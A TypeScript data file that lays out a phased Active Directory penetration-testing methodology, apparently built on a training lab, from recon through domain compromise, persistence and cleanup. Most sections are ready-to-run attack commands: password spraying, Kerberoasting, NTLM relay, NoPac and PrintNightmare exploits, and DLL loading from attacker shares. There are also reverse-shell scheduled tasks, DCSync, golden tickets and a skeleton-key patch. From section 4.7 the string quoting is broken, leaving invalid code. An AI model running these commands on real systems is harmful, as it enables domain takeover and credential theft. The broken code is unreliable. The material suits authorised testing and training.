export interface Command {
  label: string;
  cmd: string;
  description?: string;
}

export interface Section {
  title: string;
  content?: string;
  commands?: Command[];
}

export interface Phase {
  id: string;
  title: string;
  goal: string;
  sections: Section[];
}

export const methodologyData: Phase[] = [
  {
    id: "0",
    title: "PHASE 0 — Pre-Engagement & Toolkit",
    goal: "Confirm scope, setup attack host, and load core toolkit.",
    sections: [
      {
        title: "0.1 Confirm Scope (Critical)",
        content: "Before launching anything, lock down in writing:\n- In-scope IPs / CIDR / domains / subdomains\n- Out-of-scope assets (3rd-party hosts, real public sites)\n- Style: black-box / grey-box / white-box\n- Evasive / non-evasive / hybrid\n- Allowed: phishing? destructive ACL changes? legacy-host exploitation?\n- Account-lockout tolerance — MUST know the password policy threshold or get written authorization to spray\n- Reporting cadence"
      },
      {
        title: "0.2 Attack Host Setup",
        content: "Host type | Use\n---|---\nLinux (Parrot/Kali) | Default; bulk of tooling lives here\nWindows attack host | PowerView, SharpHound, Rubeus, Mimikatz, AD module, SQL admin tooling\nPwnbox / personal VM | Hash cracking (GPU rig if possible), file hosting"
      },
      {
        title: "0.3 Core Toolkit (Linux)",
        commands: [
          { label: "Impacket", cmd: "pip3 install impacket", description: "secretsdump.py, GetUserSPNs.py, GetNPUsers.py, psexec.py, wmiexec.py, mssqlclient.py, lookupsid.py, ticketer.py, raiseChild.py, smbserver.py, ntlmrelayx.py, rpcdump.py" },
          { label: "NetExec", cmd: "apt install netexec", description: "Successor to CrackMapExec" },
          { label: "Responder", cmd: "sudo apt install responder", description: "LLMNR/NBT-NS Poisoner" },
          { label: "Kerbrute", cmd: "go install github.com/ropnop/kerbrute@latest", description: "Kerberos enumeration" },
          { label: "BloodHound.py", cmd: "pip3 install bloodhound", description: "Python ingestor for BloodHound" },
          { label: "evil-winrm", cmd: "gem install evil-winrm", description: "WinRM shell" }
        ]
      },
      {
        title: "0.4 Ground Rules",
        content: "- Save EVERY scan, screenshot, and command output.\n- Maintain a spray log: target list, password used, DC queried, timestamp.\n- Compile tools yourself when possible.\n- Document any change you make for revert in cleanup phase."
      }
    ]
  },
  {
    id: "1",
    title: "PHASE 1 — External Recon",
    goal: "Validate scope, map publicly visible attack surface, and harvest data points without touching internal infra.",
    sections: [
      {
        title: "1.2 Decision Tree",
        content: "START: name + domain only\n│\n├─► IP / ASN ownership?  ──► [bgp.he.net, IANA, ARIN, RIPE]\n│         ├── Self-hosted block found → high-value\n│         └── Hosted in cloud → confirm scope\n│\n├─► DNS records ──► [nslookup, viewdns.info, domaintools, PTRArchive]\n│\n├─► OSINT public data ──► [LinkedIn, Twitter, job postings, About/Contact pages]\n│\n├─► File / metadata mining ──► [Google dorks: filetype:pdf inurl:<target>]\n│\n├─► Username harvesting ──► [linkedin2username, statistically-likely-usernames repo]\n│\n├─► Breach data ──► [HaveIBeenPwned, Dehashed]\n│\n└─► Cloud/dev storage ──► [GreyhatWarfare buckets, GitHub search, Trufflehog]"
      },
      {
        title: "1.3 Commands & Dorks",
        commands: [
          { label: "DNS: nslookup", cmd: "nslookup <target>.com", description: "Basic DNS info" },
          { label: "DNS: MX", cmd: "nslookup -type=mx <target>.com", description: "Identify mail servers" },
          { label: "Dork: PDFs", cmd: "site:<target>.com filetype:pdf", description: "Find PDFs for metadata" },
          { label: "Dork: GitHub", cmd: "site:github.com \"<target>.local\"", description: "Search for leaked internal domain names" },
          { label: "Metadata", cmd: "exiftool *.pdf | grep -i 'author\\|creator\\|producer'", description: "Extract usernames from PDFs" },
          { label: "LinkedIn", cmd: "python3 linkedin2username.py -c \"<company>\" -u <attacker_li_user>", description: "Generate user lists" },
          { label: "Dehashed", cmd: "python3 dehashed.py -q <target>.local -p", description: "Check for breached credentials" }
        ]
      }
    ]
  },
  {
    id: "2",
    title: "PHASE 2 — Internal Discovery",
    goal: "Map live hosts, identify the Domain Controller, and fingerprint services anonymously.",
    sections: [
      {
        title: "2.2 Decision Tree",
        content: "[Plugged into target subnet, no creds]\n│\n├─► Passive listening (silent — start FIRST)\n│      ├── tcpdump / wireshark — collect ARP, MDNS, NBNS, LLMNR\n│      └── responder -A (analyze mode, no poisoning yet)\n│\n├─► Active host discovery\n│      └── fping -asgq <CIDR>  → live hosts\n│\n├─► Service fingerprinting\n│      └── nmap -v -A -iL hosts.txt -oA host-enum\n│\n└─► Decision: what did you find?\n       ├── Legacy host (SMBv1, EternalBlue) → Phase 3g\n       ├── DC found (always) → continue Phase 3\n       ├── Vulnerable service (unauth printer/jboss/etc.) → exploit for SYSTEM\n       └── Otherwise → Phase 3 (poisoning + spraying)"
      },
      {
        title: "2.3 Commands",
        commands: [
          { label: "Passive: tcpdump", cmd: "sudo tcpdump -i ens224 -w baseline.pcap", description: "Baseline traffic analysis" },
          { label: "Passive: Responder", cmd: "sudo responder -I ens224 -A", description: "Listen-only mode" },
          { label: "Active: fping", cmd: "fping -asgq 172.16.5.0/23", description: "Find live hosts" },
          { label: "Active: nmap", cmd: "sudo nmap -v -A -iL hosts.txt -oA host-enum", description: "Fingerprint services" },
          { label: "Active: nmap (AD)", cmd: "sudo nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985 -sV -iL hosts.txt -oA ad-ports", description: "Targeted AD ports" },
          { label: "SMB Discovery", cmd: "crackmapexec smb <subnet>", description: "Find domain + DC names" }
        ]
      }
    ]
  },
  {
    id: "3",
    title: "PHASE 3 — Foothold Acquisition",
    goal: "Convert 'no credentials' into at least one valid domain account.",
    sections: [
      {
        title: "3a. Kerbrute Userenum",
        commands: [
          { label: "User Enum", cmd: "kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 /opt/jsmith.txt -o valid_ad_users", description: "Kerberos pre-auth enum" }
        ]
      },
      {
        title: "3b. LLMNR/NBT-NS Poisoning",
        commands: [
          { label: "Responder (Linux)", cmd: "sudo responder -I ens224 -wf", description: "Active poisoning" },
          { label: "Hashcat (Crack)", cmd: "hashcat -m 5600 hash.txt rockyou.txt", description: "Crack NTLMv2 hashes" }
        ]
      },
      {
        title: "3d. Password Policy",
        commands: [
          { label: "CME (creds)", cmd: "crackmapexec smb 172.16.5.5 -u <u> -p <p> --pass-pol", description: "Check policy with creds" },
          { label: "rpcclient (null)", cmd: "rpcclient -U \"\" -N 172.16.5.5 -c \"getdompwinfo\"", description: "Check policy with null session" }
        ]
      },
      {
        title: "3e. Password Spraying",
        commands: [
          { label: "Kerbrute (Spray)", cmd: "kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1", description: "No event 4625" },
          { label: "CME (Spray)", cmd: "sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Welcome1 | grep +", description: "SMB spraying" }
        ]
      },
      {
        title: "3f. ASREPRoasting",
        commands: [
          { label: "GetNPUsers", cmd: "GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_users.txt", description: "Roast users without pre-auth" },
          { label: "Hashcat (Crack)", cmd: "hashcat -m 18200 hash.txt rockyou.txt", description: "Crack AS-REP hashes" }
        ]
      },
      {
        title: "3g. PetitPotam (Relay)",
        commands: [
          { label: "ntlmrelayx", cmd: "sudo ntlmrelayx.py -debug -smb2support --target http://<CA_IP>/certsrv/certfnsh.asp --adcs --template DomainController", description: "Relay to AD CS" },
          { label: "PetitPotam", cmd: "python3 PetitPotam.py <Attacker_IP> <DC_IP>", description: "Coerce DC auth" }
        ]
      }
    ]
  },
  {
    id: "4",
    title: "PHASE 4 — Credentialed Enumeration",
    goal: "With the foothold credential, build a complete map of users, groups, computers, ACLs, GPOs, trusts, sessions, and shares.",
    sections: [
      {
        title: "4.3 Linux Side — CrackMapExec",
        commands: [
          { label: "CME Users", cmd: "sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users", description: "Enumerate domain users and badPwdCount" },
          { label: "CME Groups", cmd: "sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups", description: "Enumerate domain groups" },
          { label: "CME Logged-on", cmd: "sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users", description: "Find active admin sessions to hijack" },
          { label: "CME Shares", cmd: "sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares", description: "Enumerate share access and permissions" },
          { label: "CME Spider Plus", cmd: "sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'", description: "Spider every readable share for files (output to /tmp/cme_spider_plus/)" },
          { label: "CME Admin Check", cmd: "sudo crackmapexec smb 172.16.5.0/23 -u forend -p Klmcargo2", description: "Sweep subnet to find where account is local admin (Pwn3d! marker)" },
          { label: "CME PtH Check", cmd: "sudo crackmapexec smb 172.16.5.0/23 -u forend -H <NTHASH> --local-auth", description: "Check local admin access via Pass-the-Hash" }
        ]
      },
      {
        title: "4.4 Linux Side — SMBMap, rpcclient, windapsearch, ldapsearch",
        commands: [
          { label: "SMBMap List", cmd: "smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5", description: "View all share permissions" },
          { label: "SMBMap Recurse", cmd: "smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only", description: "Recurse a share (directories only)" },
          { label: "rpcclient Auth", cmd: "rpcclient -U 'INLANEFREIGHT\\\\forend%Klmcargo2' 172.16.5.5", description: "Interactive RPC shell (enumdomusers, queryuser, etc.)" },
          { label: "windapsearch Priv", cmd: "python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU", description: "Recursive privileged-user lookup" },
          { label: "windapsearch DA", cmd: "python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da", description: "Domain Admins only lookup" },
          { label: "ldapsearch Raw", cmd: "ldapsearch -h 172.16.5.5 -x -D 'forend@inlanefreight.local' -w Klmcargo2 -b 'DC=INLANEFREIGHT,DC=LOCAL' -s sub '(&(objectclass=user))' sAMAccountName memberOf", description: "Raw LDAP query for users and group membership" }
        ]
      },
      {
        title: "4.5 Linux Side — BloodHound.py",
        commands: [
          { label: "BloodHound Collect", cmd: "sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c All", description: "Python-based ingestor for full domain collection" },
          { label: "Zip Data", cmd: "zip -r ilfreight_bh.zip *.json", description: "Compress JSON output for upload" }
        ]
      },
      {
        title: "4.6 Windows Side — Built-in & PowerView",
        commands: [
          { label: "AD Module Info", cmd: "Get-ADDomain", description: "Get basic domain information" },
          { label: "AD Trust", cmd: "Get-ADTrust -Filter *", description: "Enumerate domain trusts" },
          { label: "AD Kerberoastable", cmd: "Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName", description: "Find users with SPNs" },
          { label: "AD ASREPRoastable", cmd: "Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol", description: "Find DONT_REQ_PREAUTH users" },
          { label: "AD PasswdNotReq", cmd: "Get-ADUser -Filter 'useraccountcontrol -band 32' -Properties useraccountcontrol", description: "Find PASSWD_NOTREQD accounts" },
          { label: "PV Kerberoast", cmd: "Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname", description: "PowerView: Kerberoast targets" },
          { label: "PV Admin Check", cmd: "Test-AdminAccess -ComputerName <host>", description: "Check if current user has local admin access" },
          { label: "PV Find Admin", cmd: "Find-LocalAdminAccess", description: "Find all hosts where current user is admin" },
          { label: "PV Session Hunt", cmd: "Find-DomainUserLocation -UserName <admin>", description: "Locate where high-priv users are logged in" }
        ]
      },
      {
        title: "4.7 Windows Side — SharpHound",
        commands: [
          { label: "SharpHound All", cmd: \".\\\\SharpHound.exe -c All --zipfilename ILFREIGHT\", description: \"Comprehensive BloodHound collection from Windows\" },
          { label: \"SharpHound Stealth\", cmd: \".\\\\SharpHound.exe -c All --stealth\", description: \"Quieter collection using DCOnly methods\" }
        ]
      },
      {
        title: "4.8 Windows Side — Snaffler",
        commands: [
          { label: "Snaffle Shares", cmd: \".\\\\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data -o snaffler.log\", description: \"Hunt for credentials in file shares\" }
        ]
      },
      {
        title: "4.11 Living-off-the-Land",
        commands: [
          { label: "CMD Basics", cmd: \"net user /domain && net group \\\"Domain Admins\\\" /domain && nltest /dclist:<domain>\", description: \"Standard Windows CLI enumeration\" },
          { label: \"PS History\", cmd: \"Get-Content $env:USERPROFILE\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine\\\\ConsoleHost_history.txt\", description: \"Check for passwords in PowerShell history\" },
          { label: \"dsquery Users\", cmd: \"dsquery * -filter \\\"(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))\\\" -attr distinguishedName userAccountControl\", description: \"Find PASSWD_NOTREQD users via dsquery\" }
        ]
      }
    ]
  },
  {
    id: "5",
    title: "PHASE 5 — Privilege Escalation Paths",
    goal: "Convert standard domain user → privileged user (Domain Admin / Enterprise Admin / SYSTEM on DC).",
    sections: [
      {
        title: "5.3 5a — Kerberoasting",
        commands: [
          { label: "Linux Roast", cmd: \"GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request -outputfile all_tgs.kirbi\", description: \"Request TGS tickets for all SPNs\" },
          { label: \"Rubeus Stats\", cmd: \".\\\\Rubeus.exe kerberoast /stats\", description: \"Check roastable account counts and encryption types\" },
          { label: \"Rubeus Roast\", cmd: \".\\\\Rubeus.exe kerberoast /nowrap /outfile:hashes.txt\", description: \"Roast all accounts and output to file\" },
          { label: \"Rubeus TGTDeleg\", cmd: \".\\\\Rubeus.exe kerberoast /tgtdeleg /nowrap\", description: \"Force RC4 encryption for faster cracking (downgrade attack)\" },
          { label: \"Hashcat Kerberoast\", cmd: \"hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt\", description: \"Crack RC4 TGS tickets\" }
        ]
      },
      {
        title: "5.5 5c — ACL Abuse",
        commands: [
          { label: "PV Find ACLs", cmd: \"Find-InterestingDomainAcl -ResolveGUIDs\", description: \"Find 'interesting' ACEs the current user has\" },
          { label: \"PV Force Pass\", cmd: \"Set-DomainUserPassword -Identity <victim> -AccountPassword $NewPass -Credential $Cred\", description: \"Force reset a user's password (needs ResetPassword right)\" },
          { label: \"RPC Force Pass\", cmd: \"net rpc password \\\"<victim>\\\" \\\"NewPass!\\\" -U 'DOMAIN/me%mypass' -S <DC>\", description: \"Linux: reset password via RPC\" },
          { label: \"PV Add Group\", cmd: \"Add-DomainGroupMember -Identity 'Group' -Members 'me'\", description: \"Add user to a group (needs AddMember right)\" },
          { label: \"PV Fake SPN\", cmd: \"Set-DomainObject -Identity <victim> -SET @{serviceprincipalname='fake/SPN'}\", description: \"Add fake SPN to enable Kerberoasting (needs GenericWrite)\" }
        ]
      },
      {
        title: "5.6 5d — GPP Passwords",
        commands: [
          { label: "CME GPP", cmd: \"crackmapexec smb <DC> -u me -p pass -M gpp_password\", description: \"Automated GPP cpassword decryption\" },
          { label: \"GPP Decrypt\", cmd: \"gpp-decrypt <CPASSWORD>\", description: \"Manually decrypt GPP password string\" }
        ]
      },
      {
        title: "5.8 5f — GPO Abuse",
        commands: [
          { label: "SharpGPO Admin", cmd: \"SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <me> --GPOName \\\"<GPO>\\\"\", description: \"Add yourself as local admin via GPO\" },
          { label: \"SharpGPO Task\", cmd: \"SharpGPOAbuse.exe --AddComputerTask --TaskName \\\"Update\\\" --Author NT\\\\AUTHORITY --Command \\\"cmd.exe\\\" --Arguments \\\"/c <REV_SHELL>\\\" --GPOName \\\"<GPO>\\\"\", description: \"Deploy a malicious scheduled task via GPO\" }
        ]
      },
      {
        title: "5.9 5g — NoPac (CVE-2021-42278)",
        commands: [
          { label: "NoPac Shell", cmd: \"sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap\", description: \"Get a SYSTEM shell on the DC via NoPac\" },
          { label: \"NoPac DCSync\", cmd: \"sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user administrator\", description: \"Directly DCSync administrator hash via NoPac\" }
        ]
      },
      {
        title: "5.10 5h — PrintNightmare",
        commands: [
          { label: "Trigger Exploit", cmd: \"sudo python3 CVE-2021-1675.py domain/user:pass@172.16.5.5 '\\\\\\\\<attacker_ip>\\\\CompData\\\\backupscript.dll'\", description: \"Remote SYSTEM via Print Spooler\" }
        ]
      },
      {
        title: "5.19 5q — Group-Specific Privesc (DnsAdmins)",
        commands: [
          { label: "DnsAdmins DLL", cmd: \"dnscmd <DC> /config /serverlevelplugindll \\\\\\\\<attacker>\\\\share\\\\evil.dll\", description: \"Inject malicious DLL to be loaded by DNS service\" },
          { label: \"Restart DNS\", cmd: \"sc.exe \\\\\\\\<DC> stop dns && sc.exe \\\\\\\\<DC> start dns\", description: \"Restart DNS service to load payload\" }
        ]
      }
    ]
  },
  {
    id: "6",
    title: "PHASE 6 — Lateral Movement",
    goal: "Move host-to-host hunting for privileged sessions or sensitive data.",
    sections: [
      {
        title: "6.3 6a — PsExec",
        commands: [
          { label: "Impacket PsExec", cmd: \"psexec.py inlanefreight.local/user:pass@<IP>\", description: \"Interactive SYSTEM shell via SMB/PsExec\" },
          { label: \"PsExec PtH\", cmd: \"psexec.py -hashes :<NTHASH> inlanefreight.local/user@<IP>\", description: \"Pass-the-Hash via PsExec\" }
        ]
      },
      {
        title: "6.4 6b — WMIExec",
        commands: [
          { label: "WMIExec", cmd: \"wmiexec.py inlanefreight.local/user:pass@<IP>\", description: \"Stealthier shell via WMI\" }
        ]
      },
      {
        title: "6.5 6c — WinRM",
        commands: [
          { label: "Evil-WinRM", cmd: \"evil-winrm -i <host> -u user -p pass\", description: \"PowerShell remoting shell\" },
          { label: \"Evil-WinRM PtH\", cmd: \"evil-winrm -i <host> -u user -H <NTHASH>\", description: \"Pass-the-Hash via WinRM\" },
          { label: \"Enter-PSSession\", cmd: \"Enter-PSSession -ComputerName <host> -Credential $cred\", description: \"Windows: Native PowerShell remoting\" }
        ]
      },
      {
        title: "6.6 6d — RDP",
        commands: [
          { label: "xfreerdp", cmd: \"xfreerdp /v:<host> /u:<user> /p:<pass> /dynamic-resolution /cert-ignore\", description: \"RDP connection from Linux\" },
          { label: \"xfreerdp PtH\", cmd: \"xfreerdp /v:<host> /u:<user> /pth:<NTHASH>\", description: \"Pass-the-Hash RDP (Restricted Admin mode)\" }
        ]
      },
      {
        title: "6.8 6f — Pass-the-Hash",
        commands: [
          { label: "CME PtH Sweep", cmd: \"crackmapexec smb <subnet> -u administrator -H <NTHASH> --local-auth\", description: \"Sweep subnet for local admin reuse via NTLM hash\" },
          { label: \"Mimikatz PtH\", cmd: \"sekurlsa::pth /user:administrator /domain:<domain> /ntlm:<NTHASH> /run:powershell.exe\", description: \"Inject NTLM hash into a new process\" }
        ]
      },
      {
        title: "6.9 6g — Pass-the-Ticket",
        commands: [
          { label: "Linux PtT", cmd: \"export KRB5CCNAME=admin.ccache && psexec.py -k -no-pass <host>.<domain>\", description: \"Use .ccache ticket for authentication\" },
          { label: \"Rubeus PtT\", cmd: \".\\\\Rubeus.exe ptt /ticket:ticket.kirbi\", description: \"Inject .kirbi ticket into memory\" }
        ]
      },
      {
        title: "6.10 6h — Overpass-the-Hash",
        commands: [
          { label: "Rubeus Opth", cmd: \".\\\\Rubeus.exe asktgt /user:<user> /rc4:<NTHASH> /domain:<dom> /dc:<DC> /ptt\", description: \"Request TGT from NT hash and inject into session\" }
        ]
      }
    ]
  },
  {
    id: "7",
    title: "PHASE 7 — Full Domain Compromise",
    goal: "Achieve persistent ability to authenticate as any account in the domain (typically: dump NTDS, then forge tickets at will).",
    sections: [
      {
        title: "7.2 Decision Tree",
        content: "[Have privileged path]\n│\n├─ Account has DS-Replication-Get-Changes-All? ──► DCSync (7a)\n├─ Domain Admin on DC? ──► NTDS.dit dump + SYSTEM hive (7b)\n├─ SYSTEM on DC?         ──► same as 7b\n├─ Local admin on DC via PrintNightmare/etc.? ──► same as 7b\n└─ Compromise ≠ DA, but DCSync rights granted via ACL ──► DCSync (7a)"
      },
      {
        title: "7.3 7a — DCSync",
        commands: [
          { label: "Secretsdump (Full)", cmd: \"secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5\", description: \"Dump all NTDS hashes\" },
          { label: \"Secretsdump (User)\", cmd: \"secretsdump.py -just-dc-user INLANEFREIGHT/krbtgt INLANEFREIGHT/adunn@172.16.5.5\", description: \"Targeted DCSync\" },
          { label: \"Mimikatz DCSync\", cmd: \"lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\\\\administrator\", description: \"DCSync from Windows\" }
        ]
      },
      {
        title: "7.4 7b — NTDS.dit + SYSTEM Hive Dump",
        commands: [
          { label: "VSS Shadow Copy", cmd: \"vssadmin create shadow /for=C:\", description: \"Create shadow copy for NTDS\" },
          { label: \"Copy NTDS\", cmd: \"copy \\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy1\\\\Windows\\\\NTDS\\\\NTDS.dit C:\\\\temp\\\\\", description: \"Copy NTDS from shadow\" },
          { label: \"Copy SYSTEM\", cmd: \"copy \\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy1\\\\Windows\\\\System32\\\\config\\\\SYSTEM C:\\\\temp\\\\\", description: \"Copy SYSTEM hive for decryption\" },
          { label: \"Offline Parse\", cmd: \"secretsdump.py -system SYSTEM -ntds NTDS.dit LOCAL\", description: \"Parse files on attack host\" }
        ]
      },
      {
        title: "7.5 7c — Persistence via Forged Tickets",
        commands: [
          { label: "Golden Ticket (Mimikatz)", cmd: \"kerberos::golden /user:Administrator /domain:INLANEFREIGHT.LOCAL /sid:S-1-5-21-... /krbtgt:<KRBTGT_NTHASH> /id:500 /ptt\", description: \"Forge TGT\" },
          { label: \"Golden Ticket (Rubeus)\", cmd: \".\\\\Rubeus.exe golden /rc4:<KRBTGT_NTHASH> /domain:<dom> /sid:<SID> /user:Administrator /ptt\", description: \"Forge TGT with Rubeus\" },
          { label: \"Silver Ticket\", cmd: \"kerberos::golden /user:Admin /domain:<dom> /sid:<SID> /target:<targetfqdn> /service:cifs /rc4:<SVC_HASH> /ptt\", description: \"Forge TGS for specific service\" },
          { label: \"Skeleton Key\", cmd: \"privilege::debug; misc::skeleton\", description: \"Patch LSASS for master password 'mimikatz'\" },
          { label: \"DCShadow\", cmd: \"lsadump::dcshadow /object:<user> /attribute:<attr> /value:<val>; lsadump::dcshadow /push\", description: \"Register fake DC to push changes\" }
        ]
      }
    ]
  },
  {
    id: "8",
    title: "PHASE 8 — Cross-Trust & Forest Attacks",
    goal: "After compromising one domain in a multi-domain forest (or a trusted external forest), pivot to other domains.",
    sections: [
      {
        title: "8.3 Decision Tree",
        content: "[Compromised Domain A]\n│\n├─ A is a child of B (intra-forest)?\n│      └── Yes → ExtraSids attack (8a) — child-to-parent → forest takeover\n│\n├─ A trusts B bidirectionally (forest/external)?\n│      ├── Cross-Forest Kerberoast (8b)\n│      ├── Foreign group membership (8c)\n│      ├── Password reuse across trust (8d)\n│      └── SID History abuse (if filtering off) (8e)\n│\n└─ A trusts B with TGT delegation enabled?\n       └── Printer Bug → unconstrained delegation in B → DC of B (8f)"
      },
      {
        title: "8.4 Enumeration",
        commands: [
          { label: "Get-ADTrust", cmd: \"Get-ADTrust -Filter *\", description: \"List all trusts\" },
          { label: \"PowerView Trusts\", cmd: \"Get-DomainTrustMapping\", description: \"Map domain trusts\" },
          { label: \"Foreign Members\", cmd: \"Get-DomainForeignGroupMember -Domain <other-domain>\", description: \"Find foreign members in groups\" },
          { label: \"nltest Trusts\", cmd: \"nltest /domain_trusts /all_trusts\", description: \"Quick trust list\" }
        ]
      },
      {
        title: "8.5 8a — ExtraSids Attack (Child → Parent)",
        commands: [
          { label: "raiseChild (One-shot)", cmd: \"raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm\", description: \"Automated child-to-parent escalation\" },
          { label: \"Ticketer (ExtraSids)\", cmd: \"ticketer.py -nthash <KRBTGT_NT> -domain <Child_Dom> -domain-sid <Child_SID> -extra-sid <Parent_EA_SID> hacker\", description: \"Forge Golden Ticket with ExtraSids\" },
          { label: \"Mimikatz ExtraSids\", cmd: \"kerberos::golden /user:hacker /domain:<Child_Dom> /sid:<Child_SID> /krbtgt:<KRBTGT_NT> /sids:<Parent_EA_SID> /ptt\", description: \"SID History injection via ticket\" }
        ]
      },
      {
        title: "8.6 8b — Cross-Forest Kerberoast",
        commands: [
          { label: "Rubeus Cross-Forest", cmd: \".\\\\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap\", description: \"Roast across trust\" },
          { label: \"GetUserSPNs Cross-Forest\", cmd: \"GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley\", description: \"Request TGS across forest\" }
        ]
      },
      {
        title: "8.9 8e — SID History Abuse",
        commands: [
          { label: "Enum sIDHistory", cmd: \"Get-DomainUser -LDAPFilter \\\"(sIDHistory=*)\\\" -Domain <dom>\", description: \"Find users with SID history\" },
          { label: \"Add SID History\", cmd: \"sid::add /sam:<user> /new:<Target_SID>\", description: \"Mimikatz SID history injection\" }
        ]
      },
      {
        title: "8.10 8f — Printer Bug (Cross-Forest)",
        commands: [
          { label: "Check Spooler", cmd: \"Get-SpoolStatus -ComputerName <Target_DC>\", description: \"Verify spooler is running\" },
          { label: \"SpoolSample\", cmd: \".\\\\SpoolSample.exe <Target_DC> <Attacker_Host>\", description: \"Trigger coercion across trust\" }
        ]
      }
    ]
  },
  {
    id: "9",
    title: "PHASE 9 — Persistence",
    goal: "Survive password rotations and blue-team cleanup.",
    sections: [
      {
        title: "9.1 Persistence Techniques",
        content: "Technique | Description | Cleanup\n---|---|---\nGolden Ticket | Forge any user TGT with KRBTGT hash | Rotate KRBTGT twice\nSilver Ticket | Forge TGS for single service | Rotate service account password\nSkeleton Key | LSASS patch for master password | Reboot DC\nAdminSDHolder | Modify AdminSDHolder ACL | Audit ACL on AdminSDHolder\nDCShadow | Register fake DC to push changes | Audit replication metadata\nShadow Credentials | Add msDS-KeyCredentialLink | Remove the key credential\nDSRM Account | Modify DSRM logon behavior | Reset DSRM password\nGPO Backdoor | Add startup/scheduled tasks via GPO | Review GPO contents"
      }
    ]
  },
  {
    id: "10",
    title: "PHASE 10 — Cleanup, Logging, Reporting",
    goal: "Revert changes, document activities, and provide remediation guidance.",
    sections: [
      {
        title: "10.1 Mandatory Cleanup Checklist",
        content: "- Revert any password changes or alert client.\n- Remove yourself from any groups added.\n- Delete temporary user/computer accounts (incl. NoPac accounts).\n- Remove fake SPNs and revert ACL/DACL changes.\n- Remove GPO modifications and scheduled tasks.\n- Delete uploaded payloads, DLLs, and .ccache/.kirbi files.\n- Rotate KRBTGT password twice (>10h delay)."
      },
      {
        title: "10.4 Post-Engagement Recommendations",
        content: "Issue | Remediation\n---|---\nLLMNR/NBT-NS | Disable via GPO and network adapter settings\nSMB Null Session | Disable anonymous access on legacy DCs\nWeak PW Policy | Increase min length to 14; deploy password filters\nKerberoasting | Migrate to gMSA; rotate passwords to 25+ chars\nASREPRoasting | Audit DONT_REQ_PREAUTH; require strong passwords\nGPP cpassword | Remove Groups.xml/Drives.xml with cpassword from SYSVOL\nExcessive ACLs | Audit with BloodHound; tier admin model\nLocal Admin Reuse | Deploy LAPS / LAPSv2\nNoPac/PetitPotam | Patch (KB5008380, KB5005413); set MachineAccountQuota=0"
      }
    ]
  },
  {
    id: "A",
    title: "Appendix A — Useful Hashcat Modes",
    goal: "Reference for common hash types and their corresponding hashcat modes.",
    sections: [
      {
        title: "Hashcat Mode Table",
        content: "| Mode | Hash type |\n|------|-----------|\n| 1000 | NTLM |\n| 1100 | Domain Cached Credentials (DCC, MS-Cache) |\n| 2100 | DCC2 (mscash2) |\n| 5500 | NetNTLMv1 |\n| 5600 | NetNTLMv2 (Responder) |\n| 13100 | Kerberos 5 TGS-REP etype 23 (RC4 Kerberoast) |\n| 19600 | TGS-REP etype 17 (AES-128) |\n| 19700 | TGS-REP etype 18 (AES-256) |\n| 18200 | AS-REP etype 23 (ASREPRoast) |\n| 19800 | AS-REP etype 17 |\n| 19900 | AS-REP etype 18 |\n| 7500 | Kerberos AS-REQ etype 23 |\n| 16500 | JWT |"
      }
    ]
  },
  {
    id: "B",
    title: "Appendix B — UAC Flag Decimals",
    goal: "Reference for User Account Control (UAC) flag values and their meanings.",
    sections: [
      {
        title: "UAC Flags Table",
